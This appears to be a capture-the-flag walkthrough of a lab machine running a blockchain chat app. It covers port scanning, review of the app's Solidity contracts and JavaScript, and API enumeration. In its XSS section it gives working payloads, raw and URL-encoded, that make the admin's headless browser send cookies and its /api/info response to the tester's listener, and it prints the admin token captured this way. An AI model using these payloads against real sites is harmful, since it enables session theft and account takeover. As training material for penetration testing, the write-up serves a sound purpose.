![image](https://github.com/user-attachments/assets/bc1c14a9-1796-480a-98ec-41be868a080e)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.43
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 15:22 +08
Warning: 10.10.11.43 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.43
Host is up (0.0055s latency).
Not shown: 65473 closed tcp ports (reset), 59 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 22,80,8545 -sCV 10.10.11.43
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 15:34 +08
Nmap scan report for 10.10.11.43
Host is up (0.0047s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
| ssh-hostkey:
|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)
|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)
80/tcp   open  http    Werkzeug/3.0.3 Python/3.12.3
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
|_http-title:          Home  - DBLC
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Thu, 02 Jan 2025 07:19:44 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 275864
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     Home - DBLC
|     </title>
|     <link rel="stylesheet" href="/assets/nav-bar.css">
|     </head>
|     <body>
|     <!-- <main> -->
|     <meta charset=utf-8>
|     <meta name=viewport content="width=device-width, initial-scale=1">
|     <style>
|     :after,
|     :before {
|     box-sizing: border-box;
|     border: 0 solid #e5e7eb
|     :after,
|     :before {
|     --tw-content: ""
|     :host,
|     html {
|     line-height: 1.5;
|   HTTPOptions:
|     HTTP/1.1 500 INTERNAL SERVER ERROR
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Thu, 02 Jan 2025 07:19:44 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 265
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>500 Internal Server Error</title>
|     <h1>Internal Server Error</h1>
|_    <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
8545/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 400 BAD REQUEST
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Thu, 02 Jan 2025 07:19:44 GMT
|     content-type: text/plain; charset=utf-8
|     Content-Length: 43
|     vary: origin, access-control-request-method, access-control-request-headers
|     access-control-allow-origin: *
|     date: Thu, 02 Jan 2025 07:19:44 GMT
|     Connection: close
|     Connection header did not include 'upgrade'
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Thu, 02 Jan 2025 07:19:44 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD, POST
|     Access-Control-Allow-Origin: *
|     Content-Length: 0
|     Connection: close
|   Help:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
⋮
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.16 seconds
```

## 2. Exploring the web application at `80`

Secure decentralized blockchain chat:

![image](https://github.com/user-attachments/assets/75822e10-9e19-4467-b637-6c6be89a0135)

Checking headers:

The application appears to be built using [Werkzeug](https://testdriven.io/blog/what-is-werkzeug/):

> Werkzeug is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python.

> A WSGI (Web Server Gateway Interface) server is necessary for Python web applications since a web server cannot communicate directly with Python. WSGI is an interface between a web server and a Python-based web application.

```console
root@kali:~# curl -I http://blockblock.htb/
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Thu, 02 Jan 2025 07:31:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 275864
Access-Control-Allow-Origin: http://blockblock.htb/
Access-Control-Allow-Headers: Content-Type,Authorization
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Connection: close
```

Register:

![image](https://github.com/user-attachments/assets/d2ad55c3-3c98-494d-af23-ebeb4cc783f4)

Chat:

![image](https://github.com/user-attachments/assets/c8836b89-2678-4c9b-b5c4-40f8464397b2)

Profile (`1735802729` is the timestamp in epoc time):

![image](https://github.com/user-attachments/assets/903bdd86-8c45-492c-824d-2c07340780c6)

### 2.1. Contract source code

Python contract source code is found at: http://blockblock.htb/api/contract_source

```json
{
    "Chat.sol": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\n// import \"./Database.sol\";\n\ninterface IDatabase {\n    function accountExist(\n        string calldata username\n    ) external view returns (bool);\n\n    function setChatAddress(address _chat) external;\n}\n\ncontract Chat {\n    struct Message {\n        string content;\n        string sender;\n        uint256 timestamp;\n    }\n\n    address public immutable owner;\n    IDatabase public immutable database;\n\n    mapping(string user => Message[] msg) internal userMessages;\n    uint256 internal totalMessagesCount;\n\n    event MessageSent(\n        uint indexed id,\n        uint indexed timestamp,\n        string sender,\n        string content\n    );\n\n    modifier onlyOwner() {\n        if (msg.sender != owner) {\n            revert(\"Only owner can call this function\");\n        }\n        _;\n    }\n\n    modifier onlyExistingUser(string calldata username) {\n        if (!database.accountExist(username)) {\n            revert(\"User does not exist\");\n        }\n        _;\n    }\n\n    constructor(address _database) {\n        owner = msg.sender;\n        database = IDatabase(_database);\n        database.setChatAddress(address(this));\n    }\n\n    receive() external payable {}\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n\n    function deleteUserMessages(string calldata user) public {\n        if (msg.sender != address(database)) {\n            revert(\"Only database can call this function\");\n        }\n        delete userMessages[user];\n    }\n\n    function sendMessage(\n        string calldata sender,\n        string calldata content\n    ) public onlyOwner onlyExistingUser(sender) {\n        userMessages[sender].push(Message(content, sender, block.timestamp));\n        totalMessagesCount++;\n        emit MessageSent(totalMessagesCount, block.timestamp, sender, content);\n    }\n\n    function getUserMessage(\n        string calldata user,\n        uint256 index\n    )\n        public\n        view\n        onlyOwner\n        onlyExistingUser(user)\n        returns (string memory, string memory, uint256)\n    {\n        return (\n            userMessages[user][index].content,\n            userMessages[user][index].sender,\n            userMessages[user][index].timestamp\n        );\n    }\n\n    function getUserMessagesRange(\n        string calldata user,\n        uint256 start,\n        uint256 end\n    ) public view onlyOwner onlyExistingUser(user) returns (Message[] memory) {\n        require(start < end, \"Invalid range\");\n        require(end <= userMessages[user].length, \"End index out of bounds\");\n\n        Message[] memory result = new Message[](end - start);\n        for (uint256 i = start; i < end; i++) {\n            result[i - start] = userMessages[user][i];\n        }\n        return result;\n    }\n\n    function getRecentUserMessages(\n        string calldata user,\n        uint256 count\n    ) public view onlyOwner onlyExistingUser(user) returns (Message[] memory) {\n        if (count > userMessages[user].length) {\n            count = userMessages[user].length;\n        }\n\n        Message[] memory result = new Message[](count);\n        for (uint256 i = 0; i < count; i++) {\n            result[i] = userMessages[user][\n                userMessages[user].length - count + i\n            ];\n        }\n        return result;\n    }\n\n    function getUserMessages(\n        string calldata user\n    ) public view onlyOwner onlyExistingUser(user) returns (Message[] memory) {\n        return userMessages[user];\n    }\n\n    function getUserMessagesCount(\n        string calldata user\n    ) public view onlyOwner onlyExistingUser(user) returns (uint256) {\n        return userMessages[user].length;\n    }\n\n    function getTotalMessagesCount() public view onlyOwner returns (uint256) {\n        return totalMessagesCount;\n    }\n}\n",
    "Database.sol": "// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.23;\n\ninterface IChat {\n    function deleteUserMessages(string calldata user) external;\n}\n\ncontract Database {\n    struct User {\n        string password;\n        string role;\n        bool exists;\n    }\n\n    address immutable owner;\n    IChat chat;\n\n    mapping(string username => User) users;\n\n    event AccountRegistered(string username);\n    event AccountDeleted(string username);\n    event PasswordUpdated(string username);\n    event RoleUpdated(string username);\n\n    modifier onlyOwner() {\n        if (msg.sender != owner) {\n            revert(\"Only owner can call this function\");\n        }\n        _;\n    }\n    modifier onlyExistingUser(string memory username) {\n        if (!users[username].exists) {\n            revert(\"User does not exist\");\n        }\n        _;\n    }\n\n    constructor(string memory secondaryAdminUsername,string memory password) {\n        users[\"admin\"] = User(password, \"admin\", true);\n        owner = msg.sender;\n        registerAccount(secondaryAdminUsername, password);\n    }\n\n    function accountExist(string calldata username) public view returns (bool) {\n        return users[username].exists;\n    }\n\n    function getAccount(\n        string calldata username\n    )\n        public\n        view\n        onlyOwner\n        onlyExistingUser(username)\n        returns (string memory, string memory, string memory)\n    {\n        return (username, users[username].password, users[username].role);\n    }\n\n    function setChatAddress(address _chat) public {\n        if (address(chat) != address(0)) {\n            revert(\"Chat address already set\");\n        }\n\n        chat = IChat(_chat);\n    }\n\n    function registerAccount(\n        string memory username,\n        string memory password\n    ) public onlyOwner {\n        if (\n            keccak256(bytes(users[username].password)) != keccak256(bytes(\"\"))\n        ) {\n            revert(\"Username already exists\");\n        }\n        users[username] = User(password, \"user\", true);\n        emit AccountRegistered(username);\n    }\n\n    function deleteAccount(string calldata username) public onlyOwner {\n        if (!users[username].exists) {\n            revert(\"User does not exist\");\n        }\n        delete users[username];\n\n        chat.deleteUserMessages(username);\n        emit AccountDeleted(username);\n    }\n\n    function updatePassword(\n        string calldata username,\n        string calldata oldPassword,\n        string calldata newPassword\n    ) public onlyOwner onlyExistingUser(username) {\n        if (\n            keccak256(bytes(users[username].password)) !=\n            keccak256(bytes(oldPassword))\n        ) {\n            revert(\"Invalid password\");\n        }\n\n        users[username].password = newPassword;\n        emit PasswordUpdated(username);\n    }\n\n    function updateRole(\n        string calldata username,\n        string calldata role\n    ) public onlyOwner onlyExistingUser(username) {\n        if (!users[username].exists) {\n            revert(\"User does not exist\");\n        }\n\n        users[username].role = role;\n        emit RoleUpdated(username);\n    }\n}\n"
}
```

Clearing up the content with `echo -e '<paste-content>' | sed 's/\\//'`:

<details><summary><code>Chat.sol</code></summary>

```python
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

// import "./Database.sol\";

interface IDatabase {
    function accountExist(
        string calldata username
    ) external view returns (bool);

    function setChatAddress(address _chat) external;
}

contract Chat {
    struct Message {
        string content;
        string sender;
        uint256 timestamp;
    }

    address public immutable owner;
    IDatabase public immutable database;

    mapping(string user => Message[] msg) internal userMessages;
    uint256 internal totalMessagesCount;

    event MessageSent(
        uint indexed id,
        uint indexed timestamp,
        string sender,
        string content
    );

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert("Only owner can call this function\");
        }
        _;
    }

    modifier onlyExistingUser(string calldata username) {
        if (!database.accountExist(username)) {
            revert("User does not exist\");
        }
        _;
    }

    constructor(address _database) {
        owner = msg.sender;
        database = IDatabase(_database);
        database.setChatAddress(address(this));
    }

    receive() external payable {}

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function deleteUserMessages(string calldata user) public {
        if (msg.sender != address(database)) {
            revert("Only database can call this function\");
        }
        delete userMessages[user];
    }

    function sendMessage(
        string calldata sender,
        string calldata content
    ) public onlyOwner onlyExistingUser(sender) {
        userMessages[sender].push(Message(content, sender, block.timestamp));
        totalMessagesCount++;
        emit MessageSent(totalMessagesCount, block.timestamp, sender, content);
    }

    function getUserMessage(
        string calldata user,
        uint256 index
    )
        public
        view
        onlyOwner
        onlyExistingUser(user)
        returns (string memory, string memory, uint256)
    {
        return (
            userMessages[user][index].content,
            userMessages[user][index].sender,
            userMessages[user][index].timestamp
        );
    }

    function getUserMessagesRange(
        string calldata user,
        uint256 start,
        uint256 end
    ) public view onlyOwner onlyExistingUser(user) returns (Message[] memory) {
        require(start < end, "Invalid range\");
        require(end <= userMessages[user].length, "End index out of bounds\");

        Message[] memory result = new Message[](end - start);
        for (uint256 i = start; i < end; i++) {
            result[i - start] = userMessages[user][i];
        }
        return result;
    }

    function getRecentUserMessages(
        string calldata user,
        uint256 count
    ) public view onlyOwner onlyExistingUser(user) returns (Message[] memory) {
        if (count > userMessages[user].length) {
            count = userMessages[user].length;
        }

        Message[] memory result = new Message[](count);
        for (uint256 i = 0; i < count; i++) {
            result[i] = userMessages[user][
                userMessages[user].length - count + i
            ];
        }
        return result;
    }

    function getUserMessages(
        string calldata user
    ) public view onlyOwner onlyExistingUser(user) returns (Message[] memory) {
        return userMessages[user];
    }

    function getUserMessagesCount(
        string calldata user
    ) public view onlyOwner onlyExistingUser(user) returns (uint256) {
        return userMessages[user].length;
    }

    function getTotalMessagesCount() public view onlyOwner returns (uint256) {
        return totalMessagesCount;
    }
}
```

</details>

<details><summary><code>Database.sol</code></summary>

```python
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.23;

interface IChat {
    function deleteUserMessages(string calldata user) external;
}

contract Database {
    struct User {
        string password;
        string role;
        bool exists;
    }

    address immutable owner;
    IChat chat;

    mapping(string username => User) users;

    event AccountRegistered(string username);
    event AccountDeleted(string username);
    event PasswordUpdated(string username);
    event RoleUpdated(string username);

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert("Only owner can call this function\");
        }
        _;
    }
    modifier onlyExistingUser(string memory username) {
        if (!users[username].exists) {
            revert("User does not exist\");
        }
        _;
    }

    constructor(string memory secondaryAdminUsername,string memory password) {
        users["admin\"] = User(password, \"admin\", true);
        owner = msg.sender;
        registerAccount(secondaryAdminUsername, password);
    }

    function accountExist(string calldata username) public view returns (bool) {
        return users[username].exists;
    }

    function getAccount(
        string calldata username
    )
        public
        view
        onlyOwner
        onlyExistingUser(username)
        returns (string memory, string memory, string memory)
    {
        return (username, users[username].password, users[username].role);
    }

    function setChatAddress(address _chat) public {
        if (address(chat) != address(0)) {
            revert("Chat address already set\");
        }

        chat = IChat(_chat);
    }

    function registerAccount(
        string memory username,
        string memory password
    ) public onlyOwner {
        if (
            keccak256(bytes(users[username].password)) != keccak256(bytes("\"))
        ) {
            revert("Username already exists\");
        }
        users[username] = User(password, "user\", true);
        emit AccountRegistered(username);
    }

    function deleteAccount(string calldata username) public onlyOwner {
        if (!users[username].exists) {
            revert("User does not exist\");
        }
        delete users[username];

        chat.deleteUserMessages(username);
        emit AccountDeleted(username);
    }

    function updatePassword(
        string calldata username,
        string calldata oldPassword,
        string calldata newPassword
    ) public onlyOwner onlyExistingUser(username) {
        if (
            keccak256(bytes(users[username].password)) !=
            keccak256(bytes(oldPassword))
        ) {
            revert("Invalid password\");
        }

        users[username].password = newPassword;
        emit PasswordUpdated(username);
    }

    function updateRole(
        string calldata username,
        string calldata role
    ) public onlyOwner onlyExistingUser(username) {
        if (!users[username].exists) {
            revert("User does not exist\");
        }

        users[username].role = role;
        emit RoleUpdated(username);
    }
}
```

</details>

### 2.2. Chat application source code

<details><summary>There are a few javascript found when inspecting the page source</summary>

`/login`:

```js
<script>
    let section = document.querySelector('section');
    (async () => {

        let sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        let spanCount = Math.ceil(window.innerHeight + section.offsetHeight / 4);
        for (let i = 0; i < spanCount; i++) {
            sleep(
                Math.random() * 2000
            ).then(() => {
                let span = document.createElement('span');
                section.appendChild(span);

            })
        }
    })()

    // add event listener to the form
    document.querySelector('form').addEventListener('submit', async (e) => {
        e.preventDefault();
        // let formData = new FormData(e.target);
        let response = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: e.target.username.value,
                password: e.target.password.value
            })
        });
        let result = await response.json();
        if (response.ok) {
            window.location.href = '/chat';
        } else {
            document.querySelector('.error-message').innerText = result.msg;
        }
    });

</script>
```

`/chat`:

```js
<script>
    fetch("/api/info", {
      method: "GET",
      headers: {
        "Content-Type": "application/json"
      }
    }).then((response) => {
      if (response.status != 200) {
        window.location.href = "/login";
      }
    });

    let urlParams = new URLSearchParams(window.location.search);

    let usreMessages = document.getElementById("user-messages");
    let usreMessagesSection = document.getElementById("user-messages-section");
    usreMessagesSection.style.display = "none";

    (async () => {
      let username = urlParams.get("username");
      if (username == null) {
        return;
      }
      usreMessagesSection.style.display = "block";
      let res = await fetch(`/api/get_user_messages?username=${username}`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json"
        }
      });

      if (!res.headers.get("content-type").includes("text/html")) {
        let data = await res.json();
        document.getElementById("user-messages").innerHTML += data
          .map((msg) => {
            return `<div class="msg left-msg">
        <div class="msg-img" style="background-image: url(/assets/other.svg)">
        </div>

        <div class="msg-bubble">
          <div class="msg-info">
            <div class="msg-info-name">${msg.sender}</div>
          </div>

          <div class="msg-text">
            ${escapeHtml(msg.content)}
          </div>
        </div>
      </div>`;
          })
          .join("");
      } else {
        document.getElementById(
          "user-messages"
        ).innerHTML += `<div class="msg left-msg">
        <div class="msg-bubble">
          <div class="msg-text">
            There were no messages found for the user ${username}
          </div>
        </div>
      </div>`;
      }
    })();

    (async () => {
      const response = await fetch("/api/info", {
        method: "GET",
        headers: {
          "Content-Type": "application/json"
        }
      });

      if (response.status === 401) {
        window.location.href = "/login";
      }
    })();

    async function reportUser() {
      let username = prompt(`Username to report`);
      if (username != null) {
        alert(
          "Thank you for reporting the user, Our moderators will take action as soon as possible."
        );
      }
      let res = await fetch(`${location.origin}/api/report_user`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: username
        })
      });
    }

    document.querySelector(".report-btn").addEventListener("click", reportUser);
  </script>
```
`/chat` and `/profile`:

```js
<script>
        // check if logged in

        fetch('/api/info', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        }).then(response => {
            if (response.status != 200) {
                document.getElementById('login-status').innerHTML = "<a href='/login'>Login</a>"

            }
            else {
                document.getElementById('login-status').innerHTML = "<a href='/logout'>Logout</a>"
            }
        });

    </script>
```

</details>

The following API endpoints are identified from the javascript:

- `/api/login`:
  ```js
  fetch('/api/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
    body: JSON.stringify({
      username: e.target.username.value,
      password: e.target.password.value
    })
  });
  ```

- `/api/info`:
  ```js
  fetch("/api/info", {
    method: "GET",
    headers: {
      "Content-Type": "application/json"
  });
  ```

- `/api/get_user_messages?username=${username}`:
  ```js
  fetch(`/api/get_user_messages?username=${username}`, {
    method: "GET",
    headers: {
      "Content-Type": "application/json"
    }
  });
  ```

- `/api/report_user`:
  ```js
  fetch(`${location.origin}/api/report_user`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
      body: JSON.stringify({
        username: username
      })
  });
  ```

#### 2.3.3. Exploring the application API endpoints

Trying to login the API endpoint

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNTgxOTQzMSwianRpIjoiNTc1MTA3NWItZWIyMi00YTM0LTkxNWMtMzYxMDliYTIwMWIxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE3MzU4MTk0MzEsImV4cCI6MTczNjQyNDIzMX0.EPQ_kqo_EU2oDJwLBOKd5xUfJkbn4Lpwtpexg513nHg"
}
```

To put the token as environment variable `$token`:

```sh
token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq -r .'token')
```

Trying the `/api/info` endpoint with token:

This API endpoint replies with the caller's token, this can be useful...

```sh
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/info | jq
{
  "role": "user",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNTgyMTc0MywianRpIjoiM2YyNmU5MGEtMzAxOS00MWY1LTkxZDctNWJhYWMyZjg3OGZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE3MzU4MjE3NDMsImV4cCI6MTczNjQyNjU0M30.WfeTuG4Ni04GncQnmgemHrtQeKUIHx2xLoAzgf9_s5I",
  "username": "test"
}
```

Trying the `/api/get_user_messages?username=${username}` endpoint with token:

```sh
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/get_user_messages?username=test | jq
{
  "msg": "Unauthorized"
}
```

## 3. Cross-site scripting (XSS) on `/api/report_user`

The action when a user is reported is:

```js
alert(
  "Thank you for reporting the user, Our moderators will take action as soon as possible."
);
```

### 3.1. Testing for XSS

Start Apache web server and follow (`tail -f`) the `access.log`

```console
root@kali:~# systemctl start apache2

root@kali:~# tail -f /var/log/apache2/access.log
```

Test out XSS with below code for the username value:

```html
<img src=x onerror=this.src='http://10.10.14.44/404.js?'+document.cookie>
```

Submitting via API (with [URL encoding](https://www.urlencoder.org/) on the value):

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3Dthis.src%3D%27http%3A%2F%2F10.10.14.44%2F404.js%3F%27%2Bdocument.cookie%3E"}' http://blockblock.htb/api/report_user | jq
{
  "status": "OK"
}
```

The apache access log shows that the target attempted to retrieve `404.js`:

```
10.10.11.43 - - [02/Jan/2025:22:00:19 +0800] "GET /404.js? HTTP/1.1" 404 490 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
```

### 3.2. Retrieve information using XSS

Attempt to get the application to retrieve its own `/api/info` and reflect it to Kali with below code:

```html
<img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return response.json();}).then(dataFromA => {return fetch(`http://10.10.14.44/?d=${dataFromA}`)})">
```

Submitting via API (with [URL encoding](https://www.urlencoder.org/) on the value):

```console
root@kali:~# token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq -r .'token')

root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F10.10.11.43%2Fapi%2Finfo%27%29.then%28response%20%3D%3E%20%7Breturn%20response.json%28%29%3B%7D%29.then%28dataFromA%20%3D%3E%20%7Breturn%20fetch%28%60http%3A%2F%2F10.10.14.44%2F%3Fd%3D%24%7BdataFromA%7D%60%29%7D%29%22%3E"}' http://blockblock.htb/api/report_user | jq
{
  "status": "OK"
}
```

The reflection seemed to work, but the response is `/?d=[object%20Object]`:

```
10.10.11.43 - - [02/Jan/2025:22:11:08 +0800] "GET /?d=[object%20Object] HTTP/1.1" 200 3383 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
```

### 3.3. Retrieve information using XSS (with type corrected)

The returned `[object Object]` (`%20` is URL-encoded for `space`) may mean that the json object was reflected, let's change the code to get `response.text()` instead:

```html
<img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return response.text();}).then(dataFromA => {return fetch(`http://10.10.14.44/?d=${dataFromA}`)})">
```

Submitting via API (with [URL encoding](https://www.urlencoder.org/) on the value):

```console
root@kali:~# token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq -r .'token')

root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F10.10.11.43%2Fapi%2Finfo%27%29.then%28response%20%3D%3E%20%7Breturn%20response.text%28%29%3B%7D%29.then%28dataFromA%20%3D%3E%20%7Breturn%20fetch%28%60http%3A%2F%2F10.10.14.44%2F%3Fd%3D%24%7BdataFromA%7D%60%29%7D%29%22%3E"}' http://blockblock.htb/api/report_user | jq
{
  "status": "OK"
}
```

The XSS reflected the admin credentials:

```
10.10.11.43 - - [02/Jan/2025:22:00:26 +0800] "GET /?d={%22role%22:%22admin%22,%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNTgyNTUxNiwianRpIjoiZGFmMTUyMGQtMGFmYy00ZTI0LWEwMjQtMThjYmVkMjdhZmMyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzM1ODI1NTE2LCJleHAiOjE3MzY0MzAzMTZ9.4R-d08ydPyShr16Jr0QJQi0TXGFRQKS-GoxQqDMUTQ8%22,%22username%22:%22admin%22} HTTP/1.1" 200 3383 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
```

URL-decode the string and formatting back with `jq`:

```json
{
  "role": "admin",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNTgyNTUxNiwianRpIjoiZGFmMTUyMGQtMGFmYy00ZTI0LWEwMjQtMThjYmVkMjdhZmMyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzM1ODI1NTE2LCJleHAiOjE3MzY0MzAzMTZ9.4R-d08ydPyShr16Jr0QJQi0TXGFRQKS-GoxQqDMUTQ8",
  "username": "admin"
}
```

## 4. Exploring the Admin session

Edit the token value in the browser:

![image](https://github.com/user-attachments/assets/7510b43b-3036-427d-a4ea-de1df80144f7)

A new `Admin` section pops up after refreshing the home page:

![image](https://github.com/user-attachments/assets/143d2943-db41-4bbd-9f0c-cc60471dedcb)

A user `keira` is found in the users list:

![image](https://github.com/user-attachments/assets/1e424c71-5ba4-4805-9b6c-8e5879d86b2e)

Atttempting to check user messages with admin token didn't work:

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/get_user_messages?username=keira
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
```

### 4.1. Inspect source on the admin page

Another script is found in the admin page source which reveals `/api/chat_addres` and `/api/json-rpc` endpoint

```js
<script>
        (async () => {
            const jwtSecret = await (await fetch('/api/json-rpc')).json();
            const web3 = new Web3(window.origin + "/api/json-rpc");
            const postsCountElement = document.getElementById('chat-posts-count');
            let chatAddress = await (await fetch("/api/chat_address")).text();
            let postsCount = 0;
            chatAddress = (chatAddress.replace(/[\n"]/g, ""));

            // })();
            // (async () => {
            //     let jwtSecret = await (await fetch('/api/json-rpc')).json();

            let balance = await fetch(window.origin + "/api/json-rpc", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    "token": jwtSecret['Authorization'],
                },
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    method: "eth_getBalance",
                    params: [chatAddress, "latest"],
                    id: 1
                })
            });
            let bal = (await balance.json()).result // || '0';
            console.log(bal)
            document.getElementById('donations').innerText = "$" + web3.utils.fromWei(bal,
                'ether')

        })();
        async function DeleteUser() {
            let username = document.getElementById('user-select').value;
            console.log(username)
            console.log('deleting user')
            let res = await fetch('/api/delete_user', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username
                })
            })
        }

    </script>
```

Querying the `/api/chat_address` endpoint with the admin token returns a hexadecimal string:

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/chat_address
"0x38D681F08C24b3F6A945886Ad3F98f856cc6F2f8"
```

Querying the `/api/json-rpc` endpoint with the admin token returns an `Authorization` key:

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/json-rpc | jq
{
  "Authorization": "0fc23a90bc6b4dd1f8160c7885858d93c1b505af8fd766f6d69d24a88186e383"
}
```

Testing the `POST` method in the script:

```console
